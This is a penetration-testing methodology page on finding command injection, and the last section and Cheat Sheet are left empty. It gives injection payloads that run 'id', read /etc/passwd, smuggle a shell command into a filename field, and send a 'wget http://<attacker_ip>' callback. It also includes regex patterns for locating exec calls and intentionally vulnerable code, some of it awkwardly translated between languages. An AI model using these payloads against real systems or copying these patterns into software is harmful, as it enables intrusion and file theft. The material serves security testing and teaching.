# Command Injection

## Check List

## Methodology

### Black Box

#### [Reflected Command Injection In an Embedded Cloud Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt)

{% stepper %}
{% step %}
When a web application includes a terminal, shell, or IDE interface (e.g., Cloud Shell, Dev Console, Admin Terminal), test URL parameters (project, env, config) for command injection.
{% endstep %}

{% step %}
Access the cloud console or developer environment and identify a terminal or shell interface (`via ?show=ide,terminal, ?mode=console,` or a "`Terminal`" tab)
{% endstep %}

{% step %}
Locate a configurable parameter (`project`, `env`, `workspace`, `config`) in the URL that influences the terminal session or backend configuration and Change `?project=test` and observe the terminal prompt or project name update
{% endstep %}

{% step %}
Switch to a minimal or IDE-only view (`show=ide`, `view=code`) where the parameter is likely processed in a script (`Python`, `Node.js`, `etc.`)
{% endstep %}

{% step %}
inject a single quote (`'`) into the parameter and reload; if a script syntax error appears in the terminal (`SyntaxError`, `unexpected token`), it confirms direct reflection without encoding
{% endstep %}

{% step %}
Use **syntax closure** to neutralize the original code

* If reflection is in `if 'value':`, close with `':#` to comment out the rest
* If multi-line, use triple quotes: `''';` to close strings. Set `project=asd':#` or `project=asd''';print(''` to fix syntax and gain control
{% endstep %}

{% step %}
inject `project=asd''';import os;os.system("id");print(''` , Reload and check terminal output for `uid=....`
{% endstep %}
{% endstepper %}

***

#### [Language Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt)

{% stepper %}
{% step %}
Log in to the target site
{% endstep %}

{% step %}
Then use the burp suite tool to inspect the requests and identify the endpoints
{% endstep %}

{% step %}
Then, check in the identified endpoints whether there is a parameter called `language=` or a parameter that specifies the language
{% endstep %}

{% step %}
Then send the request to the repeater and replace the language parameter value with the following content and if the send method was `GET`, change it to `POST`

```bash
{${system("cat+/etc/passwd"J)}}
```
{% endstep %}

{% step %}
Send the request and then check whether the server's response shows the sensitive file content
{% endstep %}
{% endstepper %}

***

### White Box

#### OS Command Injection in Filename

{% stepper %}
{% step %}
Identify the target product and inspect files related to modules responsible for file management, media handling, audio recording, format conversion, or user data processing
{% endstep %}

{% step %}
Identify all AJAX endpoints, APIs, or forms through which authenticated users can submit filenames, file paths, or other file-related parameters
{% endstep %}

{% step %}
Identify parameters whose values are directly received from user requests (such as `file`, `filename`, `path`, `name`, and similar arrays)
{% endstep %}

{% step %}
Trace the data flow of each parameter from the request entry point to its usage location in the code
{% endstep %}

{% step %}
Search the source code for functions that execute operating system commands, such as `exec`, `system`, `shell_exec`, `popen`, `proc_open`, or their equivalents in other languages

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void fixeRIFF(string filename){
        string[] out;
        int ret;
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret == 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(string.IsNullOrEmpty(out[0])){
                string f;
                if (Request.Form["name"] != null && Request.Form["name"].StartsWith("custom/")) {
                        f = Request.Form["name"].Replace("custom/", "");
                } else {
                        f = Request.Form["file"].Replace("custom/", "");
                }
                string cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void fixeRIFF(String filename){
        String[] out;
        int ret;
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret == 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(out[0].isEmpty()){
                String f;
                if (request.getParameter("name") != null && request.getParameter("name").startsWith("custom/")) {
                        f = request.getParameter("name").replace("custom/", "");
                } else {
                        f = request.getParameter("file").replace("custom/", "");
                }
                String cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function fixeRIFF($filename){
        exec("file -b $filename | grep 'RIFF' ", $out, $ret);
        if($ret === 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(empty($out[0])){
                if (isset($_POST["name"]) && str_starts_with($_POST["name"], "custom/")) {
                        $f = str_replace("custom/", "", $_POST["name"]);
                } else {
                        $f = str_replace("custom/", "", $_POST["file"]);
                }
                $cmd = "mv ".$this->temp."/$f.wav $filename";
                exec($cmd, $out, $ret);
        }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function fixeRIFF(filename){
        exec("file -b " + filename + " | grep 'RIFF' ", out, ret);
        if(ret === 0 ){
                dbug(_("An error is occured on RIFF detection."));
        }
        if(!out[0]){
                let f;
                if (req.body.name && req.body.name.startsWith("custom/")) {
                        f = req.body.name.replace("custom/", "");
                } else {
                        f = req.body.file.replace("custom/", "");
                }
                let cmd = "mv " + this.temp + "/" + f + ".wav " + filename;
                exec(cmd, out, ret);
        }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether user-controlled input is inserted into operating system commands without proper validation, filtering, or escaping
{% endstep %}

{% step %}
Check whether the input value can contain special shell characters such as `;`, `&&`, `|`, `` ` ``, `$()`, or similar characters
{% endstep %}

{% step %}
In one of the controllable parameters, place a filename along with a command separator character and a simple harmless command
{% endstep %}

{% step %}
Send the request and verify whether the injected command has been executed on the system

```http
POST /admin/ajax.php HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<valid-session>

file=dummy.wav;`touch /var/www/html/pawned`&language=en&temporary[en]=0&filenames[en]=dummy.wav&command=gethtml5&module=recordings
```
{% endstep %}
{% endstepper %}

***

#### Unsanitized Administrative Configuration Parameters Leading to Remote Code Execution

{% stepper %}
{% step %}
Identify the target product and inspect modules that provide administrative operations, service restart functionality, Poller management, Broker management, Agent management, or system configuration processing
{% endstep %}

{% step %}
Locate the backend files related to these functionalities and identify the paths that process administrative panel requests
{% endstep %}

{% step %}
Trace the complete data flow from the administrative interface to the point where the command is executed on the operating system
{% endstep %}

{% step %}
Search the source code for operating system command execution functions such as `shell_exec`, `exec`, `system`, `popen`, or their equivalents

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
void Reload()
{
    if ((command = this.GetReloadCommand()) != null) {
     // vulnerable code !!!   
     System.Diagnostics.Process.Start("sudo " + command);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
void reload()
{
    if ((command = this.getReloadCommand()) != null) {
     // vulnerable code !!!   
     Runtime.getRuntime().exec("sudo " + command);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function reload()
{
   if ($command = $this->getReloadCommand()) {
   // vulnerable code !!!
   shell_exec("sudo " . $command);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { exec } = require('child_process');

function reload()
{
    if (command = this.getReloadCommand()) {
     // vulnerable code !!!   
     exec("sudo " + command);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether values received from the database, administrative settings, or user requests are directly inserted into shell commands

{% tabs %}
{% tab title="C#" %}
```csharp
private string GetReloadCommand()
{
    string command = null;

    var result = this.db.Query(
        "SELECT broker_reload_command " +
        "FROM nagios_server " +
        "ORDER BY localhost DESC"
    );

    if ((row = result.Fetch()) != null) {
        command = row["broker_reload_command"];
    }

    return command;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private String getReloadCommand()
{
    String command = null;

    var result = this.db.query(
        "SELECT broker_reload_command " +
        "FROM nagios_server " +
        "ORDER BY localhost DESC"
    );

    if ((row = result.fetch()) != null) {
        command = row["broker_reload_command"];
    }

    return command;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function getReloadCommand(): ?string
{
    $command = null;

    $result = $this->db->query(
        'SELECT broker_reload_command
        FROM nagios_server
        ORDER BY localhost DESC'
    );

if ($row = $result->fetch()) {
        $command = $row['broker_reload_command'];
    }

return $command;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function getReloadCommand()
{
    let command = null;

    let result = this.db.query(
        'SELECT broker_reload_command ' +
        'FROM nagios_server ' +
        'ORDER BY localhost DESC'
    );

    if (row = result.fetch()) {
        command = row['broker_reload_command'];
    }

    return command;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then verify whether input validation or filtering is absent. Set up a local server and send the request using the system command `wget http://<attacker_ip>` in the input
{% endstep %}
{% endstepper %}

***

#### Command Injection via Misconfigured Chromium Binary Path in Administrative PDF Generation Feature

{% stepper %}
{% step %}
Identify the target website or product and log in with an administrator account.
{% endstep %}

{% step %}
Enter the application’s administrative panel and locate the system configuration paths `(Setup / Configuration)` that include parameters related to external tools
{% endstep %}

{% step %}
Then, within the setup or administrative paths, look for parameters and inputs that store tool execution paths (such as `chromium_path`, `binary_path`, or similar)
{% endstep %}

{% step %}
In the server-side code, find the files that use this value and look for the use of system execution functions such as `exec()`
{% endstep %}

{% step %}
Check whether the value read from the configuration is properly sanitized or escaped before being passed to `exec()`

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
string chromium_dir = io_safe_output(config["chromium_path"]);
var result_ejecution = System.Diagnostics.Process.Start(chromium_dir + " --version");

if (string.IsNullOrEmpty(result_ejecution.ToString()) == true) {
    if (params["return_img_base_64"]) {
        params["base64"] = true;
        
-----------------------------------------------------------------------------------
public void GeneratePDF(
    List<object> items,
    Dictionary<string, object> options = null,
    Dictionary<string, object> optionsPDF = null
)
{
    var config = Global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    string chromium_dir = io_safe_output(config["chromium_path"]);
    var result_ejecution = System.Diagnostics.Process.Start(chromium_dir + " --version");

    if (string.IsNullOrEmpty(result_ejecution.ToString()) == true)
    {
        string message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new ArgumentException(message_error);
        return;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
String chromium_dir = io_safe_output(config.get("chromium_path"));
String result_ejecution = Runtime.getRuntime().exec(chromium_dir + " --version").toString();

if (result_ejecution.isEmpty() == true) {
    if (params.get("return_img_base_64")) {
        params.put("base64", true);
--------------------------------------------------------------------------------------------

// Begin vulnerable code section
public void generatePDF(
    List<Object> items,
    Map<String, Object> options,
    Map<String, Object> optionsPDF
) {
    Map<String, Object> config = Global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    String chromium_dir = io_safe_output((String) config.get("chromium_path"));
    String result_ejecution = Runtime.getRuntime()
        .exec(chromium_dir + " --version")
        .toString();

    if (result_ejecution.isEmpty() == true) {
        String message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new IllegalArgumentException(message_error);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
$chromium_dir = io_safe_output($config['chromium_path']);
$result_ejecution = exec($chromium_dir.' --version');
if (empty($result_ejecution) === true) {
    if ($params['return_img_base_64']) {
        $params['base64'] = true;
-------------------------------------------------------------

// Begin vulnerable code section
public function generatePDF(
    array $items,
    ?array $options = [],
    ?array $optionsPDF = null
) {
    global $config;

    // If not install chromium avoid 500 convert tu images no data to show.
    $chromium_dir = io_safe_output($config['chromium_path']);
    $result_ejecution = exec($chromium_dir.' --version');
    if (empty($result_ejecution) === true) {
        $message_error = __('chromium is not installed').', ';
        $message_error .= __('To be able to create images of the graphs for PDFs, please install the chromium extension.');
        $message_error .= '<a href="https://www.chromium.org/getting-involved/download-chromium/" target="_blank">';
        $message_error .= __('Info chromium');
        $message_error .= '</a>';

        throw new InvalidArgumentException($message_error);
        return;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// /var/www/html/pandoraitsm/include/functions.php
// Function Name is generatePDF()
const chromium_dir = io_safe_output(config.chromium_path);
const { execSync } = require('child_process');

const result_ejecution = execSync(chromium_dir + " --version").toString();

if (result_ejecution.length === 0 === true) {
    if (params["return_img_base_64"]) {
        params["base64"] = true;

---------------------------------------------------------------------------

// Begin vulnerable code section
function generatePDF(
    items,
    options = {},
    optionsPDF = null
) {
    const config = global.config;

    // If not install chromium avoid 500 convert tu images no data to show.
    const chromium_dir = io_safe_output(config.chromium_path);
    const { execSync } = require('child_process');

    const result_ejecution = execSync(chromium_dir + " --version").toString();

    if (result_ejecution.length === 0 === true) {
        let message_error = __("chromium is not installed") + ", ";
        message_error += __("To be able to create images of the graphs for PDFs, please install the chromium extension.");
        message_error += "<a href=\"https://www.chromium.org/getting-involved/download-chromium/\" target=\"_blank\">";
        message_error += __("Info chromium");
        message_error += "</a>";

        throw new Error(message_error);
        return;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Important note: **this vulnerability occurs when a report is created and then exported to PDF, and the report must be of chart type to be exported to PDF. In this case, the execution path of the user input, which is `chromium_path`, reaches the `exec` function**
{% endstep %}
{% endstepper %}

***

####

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

## Cheat Sheet
